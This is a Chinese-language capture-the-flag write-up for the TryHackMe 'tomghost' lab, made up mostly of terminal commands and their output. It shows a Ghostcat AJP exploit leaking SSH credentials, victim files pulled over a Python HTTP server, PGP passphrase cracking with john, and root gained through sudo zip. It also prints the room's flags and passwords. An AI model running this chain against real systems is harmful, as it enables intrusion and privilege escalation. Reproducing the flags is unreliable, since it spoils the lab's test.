# 服务扫描
```
┌──(root💀kali)-[~/tryhackme/tomghost]
└─# nmap -sV -Pn 10.10.55.149     
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-20 04:27 EDT
Nmap scan report for 10.10.55.149
Host is up (0.31s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
8080/tcp open  http       Apache Tomcat 9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.60 seconds

```

在谷歌上搜索```Apache Jserv (Protocol v1.3)```,发现此软件存在[一个漏洞](https://www.exploit-db.com/exploits/48143)

在kali上搜索这个攻击脚本，拷贝到当前文件夹备用：
```
┌──(root💀kali)-[~/tryhackme/tomghost]
└─# searchsploit 48143
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache Tomcat - AJP 'Ghostcat File Read/Inclusion                                                                                                                                                         | multiple/webapps/48143.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/tomghost]
└─# cp /usr/share/exploitdb/exploits/multiple/webapps/48143.py 48143.py

```

# 攻击
```
┌──(root💀kali)-[~/tryhackme/tomghost]
└─# python 48143.py 10.10.55.149 -p 8009              
Getting resource at ajp13://10.10.55.149:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>

```

得到一个类似于页面的返回，期中有一段信息：
```
Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
```

房间提示里说用户名含有脏话，所以这个应该是一个ssh登录凭证

```
┌──(root💀kali)-[~/tryhackme/tomghost]
└─# ssh skyfuck@10.10.55.149
The authenticity of host '10.10.55.149 (10.10.55.149)' can't be established.
ECDSA key fingerprint is SHA256:hNxvmz+AG4q06z8p74FfXZldHr0HJsaa1FBXSoTlnss.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.55.149' (ECDSA) to the list of known hosts.
skyfuck@10.10.55.149's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
skyfuck@ubuntu:~$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 ...
10.13.21.169 - - [20/Oct/2021 01:58:16] "GET /credential.pgp HTTP/1.1" 200 -
10.13.21.169 - - [20/Oct/2021 01:58:35] "GET /tryhackme.asc HTTP/1.1" 200 -
```

在另一个用户的家目录夹拿到user.txt
```
skyfuck@ubuntu:/home/merlin$ ls
user.txt
skyfuck@ubuntu:/home/merlin$ cat user.txt 
THM{GhostCat_1s_so_cr4sy}

```


把```skyfuck```用户当前目录下的文件传回攻击机分析
```credential.pgp```是一个加密文件，看名字应该是密码
```tryhackme.asc```是pgp的加密秘钥文件


# 解密pgp文件

用```gpg2john```把tryhackme.asc转成john能识别的内容,我把输出导入到hash.txt
```
┌──(root💀kali)-[~/tryhackme/tomghost]
└─# gpg2john tryhackme.asc >hash.txt

File tryhackme.asc

```

john破解这个hash
```
┌──(root💀kali)-[~/tryhackme/tomghost]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt     
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)
1g 0:00:00:00 DONE (2021-10-20 05:37) 1.639g/s 1757p/s 1757c/s 1757C/s theresa..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```


得到密码：```alexandru```

导入pgp秘钥文件，期间输入上面的密码：
```
┌──(root💀kali)-[~/tryhackme/tomghost]
└─# gpg --import tryhackme.asc                                                                                                                                                                                                          2 ⨯
gpg: 密钥 8F3DA3DEC6707170：“tryhackme <stuxnet@tryhackme.com>” 未改变
gpg: 密钥 8F3DA3DEC6707170：私钥已导入
gpg: 密钥 8F3DA3DEC6707170：“tryhackme <stuxnet@tryhackme.com>” 未改变
gpg: 处理的总数：2
gpg:              未改变：2
gpg:       读取的私钥：1
gpg:   导入的私钥：1

```

gpg解密```credential.pgp```文件，期间再次输入上面的密码

```
┌──(root💀kali)-[~/tryhackme/tomghost]
└─# gpg credential.pgp        
gpg: 警告：没有提供命令。正在尝试猜测您的意图...
gpg: 注意：接收者的偏好设置中找不到密文算法 CAST5
gpg: 由 1024 位的 ELG 密钥加密，标识为 61E104A66184FBCC，生成于 2020-03-11
      “tryhackme <stuxnet@tryhackme.com>”
```

读取解密文件：
```
┌──(root💀kali)-[~/tryhackme/tomghost]
└─# cat credential    
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j 
```
# 提权

通过```/etc/passwd```得知merlin是期中一个用户，用上面的登陆信息切换到该用户，查看sudo权限
```
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip

```


利用```zip```命令提权到root
```
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
THM{Z1P_1S_FAKE}
# 
```